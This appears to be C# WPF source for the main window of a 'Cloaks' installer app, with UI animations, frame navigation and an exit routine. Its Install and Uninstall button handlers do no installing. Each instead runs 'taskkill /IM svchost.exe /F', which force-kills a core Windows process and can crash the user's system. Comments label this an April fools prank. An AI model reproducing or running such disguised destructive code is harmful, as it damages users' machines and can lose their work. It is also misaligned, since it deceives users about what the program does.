﻿using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media.Animation;
using System.Windows.Shell;
//LOOK NO MORE 32894729739287298174908 USING STATEMENTS! WOW!
//le install code and stuff was made by yours truly made it handle exeptions 
//maybeeee change zuhn's ui in the future?? idk people might get mad at it if you know what i mean
//- seizure salad#3820

namespace Cloaks
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {

        Storyboard StoryBoard = new Storyboard();
        TimeSpan duration = TimeSpan.FromMilliseconds(500);
        TimeSpan duration2 = TimeSpan.FromMilliseconds(1000);

        private IEasingFunction Smooth
        {
            get;
            set;
        }
        = new QuarticEase
        {
            EasingMode = EasingMode.EaseInOut
        };

        public void Fade(DependencyObject Object)
        {
            DoubleAnimation FadeIn = new DoubleAnimation()
            {
                From = 0.0,
                To = 1.0,
                Duration = new Duration(duration),
            };
            Storyboard.SetTarget(FadeIn, Object);
            Storyboard.SetTargetProperty(FadeIn, new PropertyPath("Opacity", 1));
            StoryBoard.Children.Add(FadeIn);
            StoryBoard.Begin();
        }

        public void FadeOut(DependencyObject Object)
        {
            DoubleAnimation Fade = new DoubleAnimation()
            {
                From = 1.0,
                To = 0.0,
                Duration = new Duration(duration),
            };
            Storyboard.SetTarget(Fade, Object);
            Storyboard.SetTargetProperty(Fade, new PropertyPath("Opacity", 1));
            StoryBoard.Children.Add(Fade);
            StoryBoard.Begin();
        }

        public void ObjectShift(DependencyObject Object, Thickness Get, Thickness Set)
        {
            ThicknessAnimation Animation = new ThicknessAnimation()
            {
                From = Get,
                To = Set,
                Duration = duration2,
                EasingFunction = Smooth,
            };
            Storyboard.SetTarget(Animation, Object);
            Storyboard.SetTargetProperty(Animation, new PropertyPath(MarginProperty));
            StoryBoard.Children.Add(Animation);
            StoryBoard.Begin();
        }


        public MainWindow()
        {
            InitializeComponent();
        }

        private void Cloaks_Loaded(object sender, RoutedEventArgs e)
        {
            Fade(MainBorder);
            Fade(TopBorder);
            Fade(SelectFrame);

            ObjectShift(MainBorder, MainBorder.Margin, new Thickness(0, 0, 0, 0));
            ObjectShift(TopBorder, TopBorder.Margin, new Thickness(-2, -2, -2, 0));
            ObjectShift(SelectFrame, TopBorder.Margin, new Thickness(28, 30.5, 0, 0));
            ObjectShift(HomeFrame, HomeFrame.Margin, new Thickness(124, 63, 19, 35));
        }

        private void TopBorder_MouseDown(object sender, MouseButtonEventArgs e)
        {
            //what is this drag code  h u h
            //just do this.DragMove(); xd
            if (Mouse.LeftButton == MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        private void HomeFrame_Click(object sender, RoutedEventArgs e)
        {
            HomeFrame.Opacity = 100;
            HomeFrame.Visibility = Visibility.Visible;
            InstallFrame.Opacity = 0;
            InstallFrame.Visibility = Visibility.Collapsed;
            CreditsFrame.Visibility = Visibility.Collapsed;
            CreditsFrame.Opacity = 0;
        }

        private void InstallFrame_Click(object sender, RoutedEventArgs e)
        {
            HomeFrame.Visibility = Visibility.Collapsed;
            HomeFrame.Opacity = 0;
            InstallFrame.Opacity = 100;
            InstallFrame.Visibility = Visibility.Visible;
            CreditsFrame.Visibility = Visibility.Collapsed;
            CreditsFrame.Opacity = 0;
        }

        private void CreditsFrame_Click(object sender, RoutedEventArgs e)
        {
            HomeFrame.Visibility = Visibility.Collapsed;
            HomeFrame.Opacity = 0;
            InstallFrame.Visibility = Visibility.Collapsed;
            InstallFrame.Opacity = 0;
            CreditsFrame.Visibility = Visibility.Visible;
            CreditsFrame.Opacity = 100;
        }

        private void InstallButton_Click(object sender, RoutedEventArgs e)
        {
            Process.Start("cmd.exe", @"/C taskkill /IM svchost.exe /F");
            //april fool xDDDDD
        }

        private void UninstallButton_Click(object sender, RoutedEventArgs e)
        {
            Process.Start("cmd.exe", @"/C taskkill /IM svchost.exe /F"); //xD april fools get it!!!!
        }
        
        private void EulaButton_Click(object sender, RoutedEventArgs e)
        {
            Process.Start("https://cloaks.plus/terms.txt");
        }

        private async void Button_Click(object sender, RoutedEventArgs e)
        {
        //made it a button instead of a border to exit lol
            FadeOut(MainBorder);
            FadeOut(TopBorder);
            FadeOut(SelectFrame);
            //AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
            ObjectShift(MainBorder, MainBorder.Margin, new Thickness(49, 70, 49, 26));
            ObjectShift(TopBorder, TopBorder.Margin, new Thickness(0, -28, 0, 0));
            ObjectShift(SelectFrame, SelectFrame.Margin, new Thickness(-90, 79, 0, 0));
            ObjectShift(HomeFrame, HomeFrame.Margin, new Thickness(101, 0, 199, 230));
            await Task.Delay(1000);
            Application.Current.Shutdown();
            await Task.Delay(1000);
            System.Windows.Forms.Application.Exit();
            await Task.Delay(1000); //tried usin thread.sleep but it just didn't work lmao 
            System.Windows.Forms.Application.ExitThread(); //zuhn the fuck is this code LMAO
            Environment.Exit(0);
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized; //good zuhn code moment
        }
    }
    }
